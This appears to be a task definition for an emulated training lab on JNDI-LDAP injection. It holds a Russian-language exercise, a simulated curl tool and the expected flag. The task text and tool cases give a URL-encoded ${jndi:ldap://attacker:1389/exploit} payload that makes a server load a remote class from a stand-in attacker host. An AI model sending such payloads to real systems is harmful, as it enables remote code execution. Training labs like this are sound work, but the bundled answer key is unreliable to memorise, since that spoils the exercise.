@@ -1,0 +1,37 @@
+{
+  "id": "web-jndi-rmi-deep",
+  "workdir": "/home/student/task",
+  "hostname": "lab",
+  "expect": {
+    "file": "/home/student/task/found.txt",
+    "contains": "nto{jnd1_ld4p_r3f3rr4l_rce}"
+  },
+  "fs": [
+    {
+      "path": "/home/student/task",
+      "type": "dir"
+    },
+    {
+      "path": "/home/student/task/task.md",
+      "text": "# Практика: JNDI-LDAP referral\n\nGET /lookup?name= вызывает InitialContext.lookup(name).\nПодсунь свой LDAP-referral и заставь сервер загрузить класс.\n\n1. Проверь схему:\n   curl -s 'https://app.target/lookup?name=foo'\n2. LDAP-referral (URL-кодируй $ и { как %24%7B, } как %7D):\n   curl -s 'https://app.target/lookup?name=%24%7Bjndi:ldap://attacker:1389/exploit%7D'\n3. Сервер вернёт имя загруженного класса (флаг) — запиши его в found.txt и набери check.\n"
+    }
+  ],
+  "tools": {
+    "curl": {
+      "help": "curl [опции] <url> — HTTP-клиент (эмуляция app.target/lookup)",
+      "cases": [
+        {
+          "match": "jndi|ldap|rmi://",
+          "example": "-s '.../lookup?name=%24%7Bjndi:ldap://attacker:1389/exploit%7D'",
+          "output": "loaded class: nto{jnd1_ld4p_r3f3rr4l_rce} from http://attacker:8000/Exploit.class\n"
+        },
+        {
+          "match": "lookup",
+          "example": "-s '.../lookup?name=foo'",
+          "output": "javax.naming.NameNotFoundException: foo\n"
+        }
+      ],
+      "fallback": "curl: в этой лабе эмулируется только /lookup на app.target.\n"
+    }
+  }
+}
